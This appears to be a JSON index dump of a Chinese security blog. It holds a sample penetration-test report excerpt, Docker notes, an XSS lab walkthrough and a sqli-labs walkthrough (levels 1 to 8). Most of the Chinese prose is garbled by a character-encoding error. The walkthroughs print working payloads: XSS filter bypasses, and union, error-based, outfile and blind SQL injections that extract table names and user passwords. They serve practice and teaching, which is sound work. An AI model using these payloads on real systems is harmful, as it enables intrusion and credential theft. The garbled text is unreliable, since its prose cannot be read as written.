çº§åˆ«ï¼šé«˜æè¿°ï¼šå¤šå°ä¸»æœºä½¿ç”¨äº†ç›¸åŒçš„æœ¬åœ°ç®¡ç†å‘˜å¯†ç ã€‚å½±å“ï¼šMegaCorp Oneä½¿ç”¨ç»„ç­–ç•¥æ¥è®¾ç½®GPOå†…æ‰€æœ‰ä¸»æœºçš„æœ¬åœ°ç®¡ç†å‘˜å¯†ç ã€‚ç»“æœï¼Œæ”»å‡»è€…å°±å¯ä»¥åˆ©ç”¨è‘—åçš„æ”»å‡»å·¥å…·â€œPASS-THE-HASHâ€œæ¥æ”»å‡»ï¼Œç™»å½•æ‰€æœ‰ä½¿ç”¨ç›¸åŒå¯†ç åŠç›¸åŒå¯†ç å“ˆå¸Œå€¼çš„ä¸»æœºã€‚å¦‚æ­¤ï¼Œæ”»å‡»è€…ä¸ç”¨ç ´è¯‘å¯†ç å“ˆå¸Œå€¼ï¼Œå¤§å¤§å¢åŠ äº†å®‰å…¨é£é™©ã€‚ä¿®å¤ï¼šå¼ºçƒˆå»ºè®®ç¦æ­¢ä½¿ç”¨æœ¬åœ°ç®¡ç†å‘˜è´¦æˆ·ã€‚å®åœ¨è¦ç”¨çš„è¯ï¼Œåº”åˆ†é…ä¸€ä¸ªä¸åŒçš„åå­—åŠå¤æ‚éšæœºçš„å¯†ç ã€‚ è¡¥ä¸ç®¡ç†çº§åˆ«ï¼šé«˜æè¿°ï¼šMegaCorp Oneå†…å¤–éƒ¨ç¯å¢ƒä¸­æœ‰è®¸å¤šæœªæ‰“è¡¥ä¸çš„ç³»ç»Ÿå’Œç¨‹åºã€‚å½±å“ï¼šå¼±æˆæƒæœºåˆ¶å’Œæœªæ‰“è¡¥ä¸çš„ä¸»æœºï¼Œéƒ½åŒ…å«å¯ä»¥ç”¨çˆ†ç ´çš„æ¼æ´ï¼Œè¿™ä¼šä½¿å¾—æ”»å‡»è€…ä»¥æœªæˆæƒçš„æ–¹å¼å¾—åˆ°å¤§é‡çš„å…¬å¸èµ„äº§ã€‚ç‰¹åˆ«åœ°ï¼Œä¾‹å¦‚SQLiite ManageråŒ…å«è¿œç¨‹æ‰§è¡Œä»£ç çš„æ¼æ´ï¼Œåº•å±‚ä¸»æœºä¹Ÿæœ‰ä¸€ä¸ªæœ¬åœ°ææƒçš„æ¼æ´ï¼Œè¿™äº›å¯ä»¥ä½¿å¯¹å¤–å¼€æ”¾çš„ä¸»æœºè½»æ˜“åœ°è¢«æ”»é™·ã€‚è¡¨æ˜äº†è¡¥ä¸ç®¡ç†ç­–ç•¥ä»¥åŠå¼ºåˆ¶æ‰§è¡Œçš„ä¸è¶³ã€‚ä¿®å¤ï¼šæ‰€æœ‰çš„å…¬å¸èµ„äº§éƒ½è¦åŠæ—¶æ‰“ä¸Šä¾›åº”å•†æä¾›çš„è¡¥ä¸ã€‚è¦å®Œæˆè¿™äº›å¯ä»¥ä½¿ç”¨ä¾›åº”å•†å®˜æ–¹å·¥å…·æˆ–è€…ç¬¬ä¸‰æ–¹ç¨‹åºï¼Œè¿™äº›éƒ½èƒ½æ£€æŸ¥å‡ºæœªåº”ç”¨çš„è¡¥ä¸ã€‚åœ¨è®¸å¤šä¾‹å­ä¸­ï¼Œç¬¬ä¸‰æ–¹å·¥å…·ä¹Ÿå¯ä»¥ç”¨æ¥åœ¨ä¸€ä¸ªæ··ä¹±çš„ç¯å¢ƒä¸­è¿›è¡Œè¡¥ä¸éƒ¨ç½²ã€‚ DNSåŒºåŸŸä¼ é€çº§åˆ«ï¼šä½æè¿°ï¼šä¸€ä¸ªé”™è¯¯é…ç½®çš„DNSæœåŠ¡å™¨å…è®¸æ— é™åˆ¶çš„åŒºåŸŸä¼ é€ã€‚å½±å“ï¼šä¸€ä¸ªé…ç½®æˆå¯ä¸ä»»ä½•DNSæœåŠ¡å™¨ä¼ è¾“æ•°æ®çš„DNSæœåŠ¡å™¨ï¼Œä¼šæ³„éœ²å…³äºå…¬å¸èµ„äº§å’Œç½‘ç»œå¸ƒå±€ç­‰æ•æ„Ÿä¿¡æ¯ã€‚ä¿®å¤ï¼šDNSåŒºåŸŸä¼ é€éœ€ä»…å¯¹å·²è¯æ˜çš„æœåŠ¡å™¨å¼€æ”¾ã€‚ é»˜è®¤APACHEæ–‡ä»¶ç›®å½•çº§åˆ«ï¼šä½æè¿°ï¼šåœ¨admin.megacorpone.comä¸»æœºä¸Šå‘ç°äº†é»˜è®¤çš„Apacheæ–‡ä»¶ç›®å½•ã€‚å½±å“ï¼šæ”»å‡»è€…é€šè¿‡æ£€æŸ¥é»˜è®¤æ–‡ä»¶å¤¹å¯èƒ½çŒœå‡ºApacheæœåŠ¡å™¨çš„ç‰ˆæœ¬ã€‚æ•æ„Ÿä¿¡æ¯ä¹Ÿå¯èƒ½æ³„éœ²ã€‚ä¿®å¤ï¼šç§»é™¤å…¬å¼€ç½‘ç«™çš„æ‰€æœ‰é»˜è®¤æ–‡ä»¶ã€‚ é™„å½•B:å…³äºOffensive SecurityOffensive Securityæå€¡é»‘ç›’æ¸—é€æµ‹è¯•è€Œåå¯¹ç™½ç›’æ¸—é€æµ‹è¯•ã€‚ç™½ç›’æ¸—é€æµ‹è¯•è¿‘å‡ å¹´æ¥å¾ˆç«ï¼Œå› ä¸ºåœ¨ä»…è¦å®ç°å¸¸è§„éœ€æ±‚çš„åœ°æ–¹ï¼Œç®€åŒ–äº†è¯„ä¼°æ–¹æ³•ã€‚å…¶ä½œä¸ºæ¼æ´æ‰«ææ–¹æ³•ï¼Œä¼šæœ‰é€‰æ‹©çš„ç¡®è®¤å‘ç°çš„é—®é¢˜ã€‚è¿™è®©æœåŠ¡ä¾›åº”å•†æœ‰èƒ½åŠ›æ‰©å¤§å·¥ä½œé‡ï¼Œå› ä¸ºä½¿ç”¨äº†è‡ªåŠ¨åŒ–çš„å·¥å…·ï¼Œå¹¶ä¸”é€šè¿‡è¯ä¹¦ç»´æŒäº§å“é—´çš„è”åŠ¨ã€‚é»‘ç›’æ˜¯åœ¨å—æ§ç¯å¢ƒä¸‹çš„æ”»å‡»æ¨¡æ‹Ÿå½¢å¼ï¼Œéå¸¸æ¥è¿‘ç°å®ç¯å¢ƒï¼Œç»„ç»‡ä¼šæ—¶ä¸æ—¶çš„é¢ä¸´æ”»å‡»ã€‚é»‘ç›’æµ‹è¯•æ˜¯åŸºäºç›®æ ‡çš„è¯„ä¼°æ–¹æ³•ï¼Œä¸ä»…ä»…æ˜¯å‘ç°ä¸€ä¸ªç®€å•çš„æ¼æ´ï¼Œè€Œæ˜¯æä¾›ä¸€ä¸ªæ¼æ´çœŸæ­£çš„å•†ä¸šå½±å“ã€‚é»‘ç›’æµ‹è¯•ä¼šæ‰¾åˆ°é‚£äº›ä¿®å¤åèƒ½å¸¦æ¥æœ€é«˜å•†ä¸šå›æŠ¥çš„åŒºåŸŸã€‚é»‘ç›’æµ‹è¯•é€šå¸¸éœ€è¦å¾ˆé«˜çš„ä¸“ä¸šçŸ¥è¯†ã€‚æ­£å¦‚æŠ¥å‘Šä¸­æ˜¾ç¤ºçš„é‚£æ ·ï¼ŒOffensive Securityåšä¿¡å½“è¿›è¡Œé»‘ç›’æµ‹è¯•æ—¶è¾“å‡ºæ­£ç¡®æœ‰æ•ˆçš„ç»“æœæ˜¯æ£€éªŒåˆæ ¼çš„å”¯ä¸€æ–¹å¼ï¼Œå› ä¸ºæˆ‘ä»¬ä¸“ä¸šçš„å®‰å…¨å›¢é˜Ÿè¿ç”¨äº†å¾ˆé«˜ä¸“ä¸šçŸ¥è¯†ã€‚Offensive Securityä¼šé›†ä¸­åŠ›é‡è¿›è¡Œæ¸—é€æµ‹è¯•æˆ–ç€å…¶ä»–å‚ä¸çš„é¡¹ç›®ã€‚è¿™æ„å‘³ç€æ— è®ºä»€ä¹ˆéƒ½å‚ä¸åˆ°æä¾›æœåŠ¡ä¸­ï¼Œä¾‹å¦‚æ ‡å‡†å·¥å…·Kali Linuxï¼Œç•…é”€ä¹¦çš„ä½œè€…ï¼ŒO-dayæ¼æ´çš„å‘ç°è€…ï¼Œæˆ–æ˜¯å¦‚Exploit-DBçš„ç»´æŠ¤è€…ã€‚Offensive Securityæä¾›çš„äº§å“ä¸å¸‚åœºéœ€æ±‚ä¸é…å¯¹ã€‚ç„¶è€Œï¼Œæˆ‘ä»¬ä¸ä¼šé€‚åˆä»»ä¸€å·¥ä½œã€‚Offensive Securityç‰¹åˆ«æä¾›å’¨è¯¢æœåŠ¡ï¼Œåº•å®¹é‡å’Œé«˜è´¨é‡çš„æ¯”ä¾‹ä½¿å¾—å‘˜å·¥èƒ½æ›´æ¥è¿‘çš„æ¨¡æ‹Ÿç°å®ä¸–ç•Œçš„æ”»å‡»ã€‚è¿™ä¹Ÿå…è®¸åœ¨ä¿æŒæˆæœ¬åˆç†çš„åŒæ—¶ï¼Œå®¢æˆ·å¯ä»¥æ›´å¤šåœ°è·å¾—è¡Œä¸šè®¤å¯çš„ä¸“ä¸šçŸ¥è¯†ã€‚ä¾‹å¦‚ï¼Œå¤§æ‰¹é‡/å¿«é€Ÿå‘¨è½¬æœåŠ¡é€šå¸¸ä¸é€‚åˆæˆ‘ä»¬ã€‚Offensive Securityä¸“æ³¨ä¸é¢†å¯¼é«˜è´¨é‡ï¼Œé«˜å½±å“çš„è¯„ä¼°æ´»åŠ¨ï¼Œç§¯æåœ°å¯»æ±‚å…¶ä»–ä¾›åº”å•†æ— æ³•æä¾›æœåŠ¡çš„å®¢æˆ·ã€‚è¯·é€šè¿‡info@offsec.comè”ç³»æˆ‘ä»¬ã€‚","categories":[],"tags":[{"name":"penetation test","slug":"penetation-test","permalink":"http://finsenty54.github.io/tags/penetation-test/"}]},{"title":"Dockerå­¦ä¹ ç¬”è®°","slug":"Dockerå­¦ä¹ ç¬”è®°","date":"2019-03-15T11:36:58.000Z","updated":"2019-11-19T06:16:47.752Z","comments":true,"path":"2019/03/15/Dockerå­¦ä¹ ç¬”è®°/","link":"","permalink":"http://finsenty54.github.io/2019/03/15/Dockerå­¦ä¹ ç¬”è®°/","excerpt":"sudo add-apt-repository \\ â€œdeb [arch=amd64] https://download.docker.com/linux/ubuntu \\ $(lsb_release -cs) \\ stableâ€ https://download.docker.com/linux/ubuntu/dists/bionic/pool/stable/amd64/","text":"sudo add-apt-repository \\ â€œdeb [arch=amd64] https://download.docker.com/linux/ubuntu \\ $(lsb_release -cs) \\ stableâ€ https://download.docker.com/linux/ubuntu/dists/bionic/pool/stable/amd64/ é…ç½®å®Œé•œåƒæºåï¼Œè®°å¾—é‡å¯ /bin/sh/bin/bashè¿è¡Œshell docker run â€“name mysql-data -p 3306:3306 -v /home/finsenty/Documents/mysqldata:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=â€123456â€ -d mysql:5.7 docker run -p 8888:5000 â€“name myfirstapp YOUR_USERNAME/myfirstapp Running on http://0.0.0.0:5000/ (Press CTRL+C to quit) docker rm docker ps -a -q docker rmi docker images -q docker run -p 4000:80 â€“name py-http6 â€“link mariadb:mysql finsenty/http5 mysql.connecter æŸ¥è¯¢åé¢å¸¦ä¸€ä¸ªï¼Œ -u â€œhttp://192.168.160.1/sqltest/post.php&quot; â€“forms docker run -d -p 4000:80 â€“link mysql:mysql â€“name http6 finsenty/http5 docker build -t finsenty/http5 .","categories":[],"tags":[]},{"title":"XSS 20å…³æŒ‘æˆ˜","slug":"xss","date":"2019-03-01T14:22:42.000Z","updated":"2019-05-06T02:00:06.000Z","comments":true,"path":"2019/03/01/xss/","link":"","permalink":"http://finsenty54.github.io/2019/03/01/xss/","excerpt":"less1åå°„å‹XSSä¹Ÿè¢«ç§°ä¸ºéæŒä¹…æ€§CSSå½“ç”¨æˆ·è®¿é—®ä¸€ä¸ªå¸¦æœ‰XSSä»£ç çš„URLè¯·æ±‚æ—¶ï¼ŒæœåŠ¡å™¨ç«¯æ¥æ”¶æ•°æ®åå¤„ç†ï¼Œç„¶åæŠŠå¸¦æœ‰XSSä»£ç çš„æ•°æ®å‘é€åˆ°æµè§ˆå™¨ï¼Œæµè§ˆå™¨è§£æè¿™æ®µå¸¦æœ‰XSSä»£ç çš„æ•°æ®åï¼Œæœ€ç»ˆé€ æˆXSSæ¼æ´ã€‚ alert() æ–¹æ³•ç”¨äºæ˜¾ç¤ºå¸¦æœ‰ä¸€æ¡æŒ‡å®šæ¶ˆæ¯å’Œä¸€ä¸ª OK æŒ‰é’®çš„è­¦å‘Šæ¡†ã€‚ æŸ¥çœ‹æºç window.alert = function()echo &quot;&lt;h2 align=center&gt;æ¬¢è¿ç”¨æˆ·&quot;.$str.&quot;&lt;/h2&gt;&quot;;æ²¡æœ‰è¿‡æ»¤ç›´æ¥è°ƒç”¨å‡½æ•°å°±å¯ä»¥é€šå…³&lt;script&gt;window.alert()&lt;/script&gt; &lt;script&gt; æ ‡ç­¾ç”¨äºå®šä¹‰å®¢æˆ·ç«¯è„šæœ¬ï¼Œæ¯”å¦‚ JavaScriptã€‚","text":"less1åå°„å‹XSSä¹Ÿè¢«ç§°ä¸ºéæŒä¹…æ€§CSSå½“ç”¨æˆ·è®¿é—®ä¸€ä¸ªå¸¦æœ‰XSSä»£ç çš„URLè¯·æ±‚æ—¶ï¼ŒæœåŠ¡å™¨ç«¯æ¥æ”¶æ•°æ®åå¤„ç†ï¼Œç„¶åæŠŠå¸¦æœ‰XSSä»£ç çš„æ•°æ®å‘é€åˆ°æµè§ˆå™¨ï¼Œæµè§ˆå™¨è§£æè¿™æ®µå¸¦æœ‰XSSä»£ç çš„æ•°æ®åï¼Œæœ€ç»ˆé€ æˆXSSæ¼æ´ã€‚ alert() æ–¹æ³•ç”¨äºæ˜¾ç¤ºå¸¦æœ‰ä¸€æ¡æŒ‡å®šæ¶ˆæ¯å’Œä¸€ä¸ª OK æŒ‰é’®çš„è­¦å‘Šæ¡†ã€‚ æŸ¥çœ‹æºç window.alert = function()echo &quot;&lt;h2 align=center&gt;æ¬¢è¿ç”¨æˆ·&quot;.$str.&quot;&lt;/h2&gt;&quot;;æ²¡æœ‰è¿‡æ»¤ç›´æ¥è°ƒç”¨å‡½æ•°å°±å¯ä»¥é€šå…³&lt;script&gt;window.alert()&lt;/script&gt; &lt;script&gt; æ ‡ç­¾ç”¨äºå®šä¹‰å®¢æˆ·ç«¯è„šæœ¬ï¼Œæ¯”å¦‚ JavaScriptã€‚ less2åˆ©ç”¨é¡µé¢å…ƒç´ çœ‹åˆ°è¾“å…¥åœ¨&lt;input name=keyword value=&quot;&#39;.$str.&#39;&quot;&gt;é—­åˆinputè¯­å¥å³å¯1&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;1&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&lt;&quot; less3æŸ¥çœ‹é¡µé¢å…ƒç´ &lt;input name=keyword value=&#39;1&#39;&gt;åœ¨inputè¯­å¥é‡Œå°è¯•é—­åˆæ— ç”¨æŸ¥çœ‹æºç stréƒ½åŠ ä¸Šäº†htmlspecialcharså‡½æ•°ï¼Œä½†é»˜è®¤é…ç½®æ˜¯ä¸è¿‡æ»¤å•å¼•å·çš„&#39;onmouseover=&#39;window.alert()å³å¯ è¾“å…¥&#39; &lt;input name=&quot;keyword&quot; value=&quot;&quot; &#39;=&quot;&quot;&gt;è¾“å…¥&#39;&#39; &lt;input name=&quot;keyword&quot; value=&quot;&quot; &#39;&#39;=&quot;&quot;&gt;è¾“å…¥&#39;onclick&#39; &lt;input name=&quot;keyword&quot; value=&quot;&quot; onclick&#39;&#39;=&quot;&quot;&gt;è¾“å…¥onclick= &lt;input name=&quot;keyword&quot; value=&quot;&quot; onclick=&quot;&quot;&gt; less4è¾“å…¥&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&lt;&quot;æŸ¥çœ‹å¯çŸ¥&lt;input name=&quot;keyword&quot; value=&quot;&quot; scriptalert()=&quot;&quot; script&quot;&quot;=&quot;&quot;&gt;è¿‡æ»¤äº†&lt; &gt;åˆ©ç”¨ä¸ŠèŠ‚æ–¹æ³•&quot;onclick=&quot;alert() æ›´æ–°äº2019-03-03 11:19:50 æ˜ŸæœŸæ—¥ less5è¯•è¿‡åå‘ç°onclickå˜ä¸ºo_nclickscriptå˜ä¸ºsc_riptä½¿ç”¨&quot;&gt;&lt;a href=&quot;javascript:alert()&quot;&gt; less6onclick script hrefè¾“å…¥åéƒ½è¿›è¡Œäº†å˜åŒ–&quot;&gt;&lt;a HRef=&quot;javascript:alert()&quot;&gt;keyword=&quot;ONclick=&quot;alert()keyword=&quot;&gt;&lt;scriPt&gt;alert()&lt;/SCRIpt&gt;&lt;&quot;keyword=&quot;&gt;&lt;a HreF=javascript:alert()&gt;213&lt;/a&gt;&quot;&lt;è¿›è¡Œå¤§å°å†™æ›¿æ¢å¯ä»¥ less7scriptè¢«è¿‡æ»¤ï¼Œæ”¹å˜å¤§å°å†™ä¹Ÿæ²¡æœ‰ç”¨onè¢«è¿‡æ»¤hrefåŒæ ·å¦‚æ­¤keyword=&quot;&gt;&lt;scriscriptpt&gt;alert()&lt;/scrscriptipt&gt;&lt;&quot;åˆ©ç”¨åŒå†™ç»•è¿‡ æ›´æ–°äº2019-03-06 21:20:39 æ˜ŸæœŸä¸‰ less8è¿™é¢˜å¯ä»¥æ·»åŠ é“¾æ¥ç›´æ¥ä½¿ç”¨javascript:alert(1)ä½†å¹¶æ²¡æœ‰ç”¨ï¼ŒæŸ¥çœ‹æºç $str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);è¢«æ›¿æ¢äº†ä½¿ç”¨åˆ¶è¡¨ç¬¦ç»•è¿‡%09keyword=javasc%09ript%3Aalert%281%29&amp;submit=æ·»åŠ å‹æƒ…é“¾æ¥ less9ä¸Šé¢˜ç»“æœæ²¡æœ‰ç”¨ï¼ŒæŸ¥çœ‹æºç if(false===strpos($str7,&#39;http://&#39;))çŸ¥ä¸€å®šè¦æœ‰http://åœ¨javascriptä¼ªåè®®é‡Œé¢ï¼Œå±äºjsèŒƒç•´ï¼Œæ‰€ä»¥å•è¡Œæ³¨é‡Šç¬¦æ˜¯å¯ä»¥ä½¿ç”¨çš„javasc%09ript%3Aalert%281%29//http://www.test.com less10æŸ¥çœ‹é¡µé¢å…ƒç´ æœ‰å‡ ä¸ªéšè—çš„å€¼ï¼Œæ³¨å…¥ç‚¹å°±åœ¨è¿™keyword=test&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert() æ›´æ–°äº2019-03-27 18:15:42 æ˜ŸæœŸä¸‰","categories":[],"tags":[{"name":"xss","slug":"xss","permalink":"http://finsenty54.github.io/tags/xss/"}]},{"title":"sqli-labs(less-1__less-22)","slug":"sqli-labs","date":"2019-02-26T09:01:08.000Z","updated":"2019-05-06T01:54:52.000Z","comments":true,"path":"2019/02/26/sqli-labs/","link":"","permalink":"http://finsenty54.github.io/2019/02/26/sqli-labs/","excerpt":"é—­åˆæœ‰&#39; &quot; ) å•åŒå¼•å·ä¸èƒ½åŒæ—¶å­˜åœ¨ï¼Œ) å¯æœ‰å¤šä¸ª Less-1 single å•ä¸ªçš„quote å¼•å·å˜é‡å‰é¢åŠ  ?information_schema.tablesinformation_schema.columnsinformation_schema.schemata åœ¨Less-1é‡Œçš„index.phpä¸­æ·»åŠ  echo $sql; å¯åœ¨ç½‘é¡µä¸­æ˜¾ç¤ºæŸ¥è¯¢ä»£ç ï¼Œecho &quot;&lt;br&gt;&quot;; è¡¨ç¤ºæ¢è¡Œ","text":"é—­åˆæœ‰&#39; &quot; ) å•åŒå¼•å·ä¸èƒ½åŒæ—¶å­˜åœ¨ï¼Œ) å¯æœ‰å¤šä¸ª Less-1 single å•ä¸ªçš„quote å¼•å·å˜é‡å‰é¢åŠ  ?information_schema.tablesinformation_schema.columnsinformation_schema.schemata åœ¨Less-1é‡Œçš„index.phpä¸­æ·»åŠ  echo $sql; å¯åœ¨ç½‘é¡µä¸­æ˜¾ç¤ºæŸ¥è¯¢ä»£ç ï¼Œecho &quot;&lt;br&gt;&quot;; è¡¨ç¤ºæ¢è¡Œ ?id=1&#39; and 1=1 --+ æ²¡æœ‰æŠ¥é”™ï¼Œè¿”å›æ­£ç¡®ç»“æœ ?id=10&#39; æŠ¥é”™ You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;&#39;10&#39;&#39; LIMIT 0,1&#39; at line 1 ?id=1&#39; and 1=2 --+ æ²¡æœ‰æ­£ç¡®ç»“æœç»è¿‡è¿™ä¸‰ä¸ªæ­¥éª¤è¯´æ˜æ˜¯å­—ç¬¦å‹æ³¨å…¥ ä½¿ç”¨order byæ¥åˆ¤æ–­æœ‰å‡ ä¸ªå­—æ®µ?id=1&#39; order by 4--+æŠ¥é”™Unknown column &#39;4&#39; in &#39;order clause&#39;è¯´æ˜æœ‰3ä¸ªå­—æ®µ LIMIT 0,1 è¡¨ç¤ºç»“æœåªæ˜¾ç¤ºä¸€è¡Œ?id=-1&#39; union select 1,2,3 --+ çœ‹å“ªä¸ªå­—æ®µå¯ä»¥å›æ˜¾ ?id=1&#39; union select 1,concat_ws(&#39;_&#39;,version(),user(),database()),@@basedir --+å¾—åˆ°ç‰ˆæœ¬ï¼Œç”¨æˆ·ï¼Œå½“å‰æ•°æ®åº“ï¼Œæ•°æ®è·¯å¾„concat_ws å¸¦åˆ†éš”ç¬¦çš„é“¾æ¥ ?id=-1&#39; union select 1, group_concat(table_name),3 from information_schema.tables where table_schema = database() --+å¾—åˆ°å½“å‰åº“çš„è¡¨å?id=-1&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata) ,3 --+æŸ¥çœ‹æ•°æ®åº“åä¿¡æ¯group_concat è¡Œè½¬åˆ— ?id=-1 &#39; union select 1, (select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;), 3 --+users è¡¨çš„åˆ—å ?id=-1 &#39; union select 1,(select group_concat(password) from users) ,3 --+å¾—å‡ºè´¦æˆ·å¯†ç  Less-2 ?id=1&#39;æŠ¥é”™ ?id=1 and 1=1æ­£ç¡® ?id=1 and 1=2é”™è¯¯å¯çŸ¥æ˜¯æ•°å­—å‹æ³¨å…¥è§£é¢˜ä¸ç¬¬ä¸€é¢˜ç±»ä¼¼ï¼Œä¸å†èµ˜è¿° Less-3æŸ¥çœ‹æºç å¯çŸ¥ï¼Œç”¨()åŠ åœ¨äº†idä¸¤è¾¹ï¼Œæ‰€ä»¥åªè¦å°†()é—­åˆå°±è¡Œäº†?id=-1&#39;) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+?id=-1&#39;) union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;),3--+?id=-1&#39;) union select 1,(select group_concat(password) from users),3--+ Less-4æŸ¥çœ‹æºç ï¼Œidä¸¤è¾¹åŠ äº†â€,ç”¨?id=-1&quot;)é—­åˆ Less-5åŒæ³¨å…¥ Rand() //éšæœºå‡½æ•° Floor() //å–æ•´å‡½æ•° Count() //æ±‡æ€»å‡½æ•° Group by clause //åˆ†ç»„è¯­å¥ https://blog.csdn.net/Leep0rt/article/details/78556440 ?id=1&#39; union select count(*),1,concat((select database()), &#39;_&#39;,floor(rand()*2)) as a from information_schema.columns group by a--+select æŸ¥è¯¢åˆ—æ•°è¦ç›¸åŒï¼Œå¦åˆ™æŠ¥é”™ ?id=1&#39; union select count(*),1,concat((select password from users limit 5,1), &#39;_&#39;,floor(rand()*2)) as a from information_schema.columns group by a--+ç”¨group_concatä¼šæŠ¥é”™ï¼Œä½¿ç”¨limit æ›´æ–°äº2019-03-01 22:21:15 æ˜ŸæœŸäº” Less-6å°è¯•æ³¨å…¥åå¯çŸ¥æ˜¯ç”¨&quot;é—­åˆï¼Œå­—ç¬¦ä¸²å‹å…¶ä»–å’Œä¸Šé¢˜ä¸€è‡´?id=1&quot; union select count(*),concat( (select user()),&#39;_&#39;,floor(rand()*2) ) as a,3 from information_schema.schemata group by a --+ ?id=1&quot; union select count(*),concat( (select table_name from information_schema.tables where table_schema=database() limit 3,1 ),&#39;_&#39;,floor(rand()*2) ) as a,3 from information_schema.schemata group by a --+ ?id=1&quot; union select count(*),concat( (select column_name from information_schema.columns where table_name=&quot;users&quot; limit 5,1 ),&#39;_&#39;,floor(rand()*2) ) as a,3 from information_schema.schemata group by a --+ ?id=1&quot; union select count(*),concat( (select password from users limit 0,1 ),&#39;_&#39;,floor(rand()*2) ) as a,3 from information_schema.schemata group by a --+ æ›´æ–°äº2019-03-03 11:48:51 æ˜ŸæœŸæ—¥ Lss-7åˆ©ç”¨outfileæ–‡ä»¶ä¸€èˆ¬åœ¨SqlæŸ¥è¯¢è¯­å¥ä¸­ï¼Œæƒ³è¦æ­£å¸¸æŸ¥è¯¢åˆ°ä¿¡æ¯ï¼Œåªèƒ½åœ¨æœ€é‡Œå±‚æœ‰å¼•å·ï¼Œå¤–å±‚å…¨æ˜¯å°æ‹¬å·ã€‚å³å·²çŸ¥æ³¨å…¥ç±»å‹åä¾æ¬¡å¢åŠ æ‹¬å·æ•°å¿…èƒ½åˆ†æå‡ºæ‹¬å·æ•°ï¼ˆå­˜åœ¨æ³¨å…¥ç‚¹ï¼‰ã€‚æ•°æ®åº“çš„fileæƒé™è§„å®šäº†æ•°æ®åº“ç”¨æˆ·æ˜¯å¦æœ‰æƒé™å‘æ“ä½œç³»ç»Ÿå†…å†™å…¥å’Œè¯»å–å·²å­˜åœ¨çš„æƒé™éœ€è¦åœ¨æŒ‡å®šçš„ç›®å½•ä¸‹è¿›è¡Œæ•°æ®çš„å¯¼å‡ºã€‚éœ€è¦æ³¨æ„çš„æ˜¯åˆ©ç”¨æ•°æ®åº“fileæƒé™å‘æ“ä½œç³»ç»Ÿå†™å…¥æ–‡ä»¶æ—¶ï¼Œ å¯¹äºç›¸åŒæ–‡ä»¶åçš„æ–‡ä»¶ä¸èƒ½è¦†ç›– secure_file_privè¿™ä¸ªå‚æ•°ç”¨æ¥é™åˆ¶æ•°æ®å¯¼å…¥å’Œå¯¼å‡ºæ“ä½œçš„æ•ˆæœï¼Œä¾‹å¦‚æ‰§è¡Œload dataã€into outfileè¯­å¥å’Œload_file()å‡½æ•°,è¿™äº›æ“ä½œéœ€è¦ç”¨æˆ·å…·æœ‰fileæƒé™ã€‚ å¦‚æœè¿™ä¸ªå‚æ•°ä¸ºç©ºï¼Œè¿™ä¸ªå˜é‡æ²¡æœ‰æ•ˆæœã€‚ å¦‚æœè¿™ä¸ªå‚æ•°è®¾ä¸ºä¸€ä¸ªç›®å½•åï¼ŒMysqlæœåŠ¡åªå…è®¸åœ¨è¿™ä¸ªç›®å½•ä¸­æ‰§è¡Œæ–‡ä»¶çš„å¯¼å…¥å’Œå¯¼å‡ºæ“ä½œã€‚è¿™ä¸ªç›®å½•å¿…é¡»å­˜åœ¨ï¼ŒMySQLæœåŠ¡ä¸ä¼šåˆ›å»ºå®ƒ. å¦‚æœè¿™ä¸ªå‚æ•°ä¸ºnullï¼ŒMysqlæœåŠ¡ä¼šç¦æ­¢å¯¼å…¥å’Œå¯¼å‡ºæ“ä½œã€‚è¿™ä¸ªå‚æ•°åœ¨MySQL 5.7.6ç‰ˆæœ¬å¼•å…¥ã€‚ @@datadir è¯»å–æ•°æ®åº“è·¯å¾„@@basedir MYSQL è·å–å®‰è£…è·¯å¾„ åœ¨Mysqlä¸­ï¼Œéœ€è¦æ³¨æ„è·¯å¾„è½¬ä¹‰çš„é—®é¢˜ï¼Œå³ç”¨\\åˆ†éš”ã€‚ https://www.jianshu.com/p/7b9256de20d1 ç»è¿‡æµ‹è¯•ï¼Œç”¨&#39;)) æ¥é—­åˆ ?id=1&#39;)) union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) into outfile &quot;C:\\\\xampp\\\\mysql\\\\data\\\\security\\\\4.txt&quot; --+ ?id=1&#39;)) union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;) into outfile &quot;C:\\\\xampp\\\\mysql\\\\data\\\\security\\\\5.txt&quot; --+ ?id=1&#39;)) union select 1,2,(select group_concat(password) from users) into outfile &quot;C:\\\\xampp\\\\mysql\\\\data\\\\security\\\\6.txt&quot; --+ Less-8ç›²æ³¨å¸ƒå°”æ³¨å…¥å½“ä¸€ä¸ªé¡µé¢ï¼Œå­˜åœ¨æ³¨å…¥ï¼Œæ²¡æ˜¾ç¤ºä½ï¼Œæ²¡æœ‰æ•°æ®åº“å‡ºé”™ä¿¡æ¯ï¼Œåªèƒ½é€šè¿‡é¡µé¢è¿”å›æ­£å¸¸ä¸æ­£å¸¸è¿›è¡Œåˆ¤æ–­è¿›è¡Œsqlæ³¨å…¥ã€‚ existsï¼ˆï¼‰ç”¨äºæ£€æŸ¥ å­æŸ¥è¯¢æ˜¯å¦æœ‰è¿”å›æ•°æ®ã€‚ ç»“æœæ˜¯ tureæˆ–è€…false asciiï¼ˆï¼‰æŠŠå­—ç¬¦è½¬åŒ–æˆasciiç  substrï¼ˆï¼‰substrï¼ˆstring stringï¼Œnum startï¼Œnum lengthï¼‰ï¼›åç§»ä»1å¼€å§‹çš„ å¹¶ä¸æ˜¯0ï¼› DISTINCT å»é‡å¤?id=1&#39; and (select ascii(substr( (select database()) ,1,1))&gt;115) --+ ?id=1&#39; and ((select count(distinct+table_schema) from information_schema.tables)&gt;6)--+ ?id=1&#39; and (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;101)--+ ?id=1&#39; and (select ascii(substr( (select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1) ,1,1))&gt;11) --+ ?id=1&#39; and (select ascii(substr( (select password from users limit 0,1) ,1,1))&gt;68) --+ select database() 